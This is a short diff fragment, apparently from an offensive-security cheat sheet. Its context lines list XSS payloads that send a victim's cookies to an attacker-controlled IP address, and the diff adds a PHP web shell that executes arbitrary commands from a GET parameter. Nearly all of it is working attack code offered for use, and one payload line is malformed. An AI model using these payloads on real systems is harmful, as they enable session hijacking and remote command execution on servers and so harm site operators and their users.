@@ -13,3 +13,18 @@ ON WEB BROWSER: <script>document.location="http://10.50.20.97/Cookie_Stealer1.ph
 <script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
 <script>window.location.href="http://website/?"+document.cookie;</script>
 <script>write.location.href="http://10.50.20.97"</script>
+---
+WEB SHELL SCRIPT:
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
